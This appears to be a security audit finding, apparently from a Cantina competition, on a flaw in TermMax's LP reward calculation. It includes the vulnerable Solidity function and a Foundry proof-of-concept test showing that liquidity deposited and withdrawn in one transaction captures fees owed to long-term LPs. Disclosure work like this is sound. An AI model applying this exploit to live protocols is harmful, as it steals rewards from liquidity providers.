---
# Core Classification
protocol: TermMax
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 54913
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/850188b4-3c16-4d60-97aa-0eeb288b0434
source_link: https://cdn.cantina.xyz/reports/cantina_competition_term_max_december2024.pdf
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 5
finders:
  - newspacexyz
  - davidjohn241018
  - Roberto
  - 0x37
  - Honour
---

## Vulnerability Title

Malicious users can steal swap fees from liquidity providers 

### Overview


Bug Summary: Malicious users can exploit a flaw in the swap process to deposit and remove liquidity in one transaction, stealing some LP rewards.

Impact: This bug can be used by malicious users to steal rewards from normal LP holders, causing them to lose some of their earnings.

Likelihood: This bug does not require any special conditions and can be easily exploited if there are accrued rewards.

Proof of Concept: A test case was added to demonstrate how the bug can be exploited, showing that the normal LP holder loses some rewards when a malicious user adds and removes liquidity before the normal user's removal.

Recommendation: The team should consider the actual active time of liquidity in the pool when calculating rewards to prevent this type of exploit.

### Original Finding Content

## Finding Summary

**Context:** No context files were provided by the reviewer.

**Summary:** Malicious users can deposit liquidity and remove liquidity in one transaction to steal some LP rewards.

## Finding Description

In the swap process, some swap fees will be generated, and these swap fees are in terms of LP tokens. When LP holders want to remove liquidity, they will receive some rewards according to the fee distribution. We have designed a model where LPs can earn more rewards if they hold their LP longer. However, the issue arises because even if liquidity is deposited within this transaction, LPs can still obtain rewards via the removal of liquidity.

```solidity
function calculateLpReward(
    uint256 currentTime,
    uint256 openMarketTime,
    uint256 maturity,
    uint256 lpSupply,
    uint256 lpAmt,
    uint256 totalReward
) internal pure returns (uint256 reward) {
    uint t = (lpSupply - totalReward) * (2 * maturity - openMarketTime - currentTime);
    reward = ((totalReward * lpAmt) * (currentTime - openMarketTime)) / t;
}
```

## Impact Explanation

Malicious users can exploit this design to steal rewards via flash loans, causing normal LPs to lose some of their rewards.

## Likelihood Explanation

This issue does not require any special conditions. If there are accrued rewards, malicious users can seize them.

## Proof of Concept

Add this test case into `TermMaxRouter.t.sol`. In this scenario, Alice is the malicious user, and the deployer is the normal LP. If Alice does not add/remove liquidity in this test case, the output is as follows:

- FT amount received by deployer: `880738388498`
- XT amount received by deployer: `1000821070844`

If Alice adds and removes liquidity before the deployer's removal, the output changes to:

- FT amount received by deployer: `880036223746`
- XT amount received by deployer: `999548671891`

Comparing these two results, the normal user (Deployer) loses some rewards.

### Test Function

```solidity
function testPocReward() public {
    vm.startPrank(deployer);
    res.underlying.approve(address(res.market), 2000e8);
    
    // Trade some FT, XT to generate some swap fees.
    res.market.buyFt(1000e8, 0);
    res.market.buyXt(1000e8, 0);
    
    res.ft.approve(address(res.market), res.ft.balanceOf(deployer));
    res.xt.approve(address(res.market), res.xt.balanceOf(deployer));
    res.market.sellFt(uint128(res.ft.balanceOf(deployer)), 0);
    res.market.sellXt(uint128(res.xt.balanceOf(deployer)), 0);
    
    vm.stopPrank();
    console.log("maturity: ", res.marketConfig.maturity);
    console.log("current block.timestamp: ", block.timestamp);
    
    vm.warp(block.timestamp + 57 days);
    console.log("current block.timestamp reaches the maturity: ", block.timestamp);
    
    vm.startPrank(alice);
    res.underlying.approve(address(res.market), 100000e8);
    res.market.provideLiquidity(100000e8);
    
    res.lpFt.approve(address(router), res.lpFt.balanceOf(alice));
    res.lpXt.approve(address(router), res.lpXt.balanceOf(alice));
    
    router.withdrawLiquidityToFtXt(alice, res.market, res.lpFt.balanceOf(alice), res.lpXt.balanceOf(alice), 0, 0);
    
    console.log("Alice FT received amount: ", res.ft.balanceOf(alice));
    console.log("Alice XT received amount: ", res.xt.balanceOf(alice));
    
    vm.stopPrank();
    
    vm.startPrank(deployer);
    res.lpFt.approve(address(router), res.lpFt.balanceOf(deployer));
    res.lpXt.approve(address(router), res.lpXt.balanceOf(deployer));
    
    router.withdrawLiquidityToFtXt(deployer, res.market, res.lpFt.balanceOf(deployer) - 1, res.lpXt.balanceOf(deployer) - 1, 0, 0);
    
    console.log("FT amount received in deployer: ", res.ft.balanceOf(deployer));
    console.log("XT amount received in deployer: ", res.xt.balanceOf(deployer));
    
    res.ft.transfer(address(res.market), res.ft.balanceOf(deployer));
    res.xt.transfer(address(res.market), res.xt.balanceOf(deployer));
    
    vm.stopPrank();
}
```

## Recommendation

We should consider the liquidity's actual active time in the pool when calculating the rewards associated with this liquidity.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | TermMax |
| Report Date | N/A |
| Finders | newspacexyz, davidjohn241018, Roberto, 0x37, Honour |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_competition_term_max_december2024.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/850188b4-3c16-4d60-97aa-0eeb288b0434

### Keywords for Search

`vulnerability`

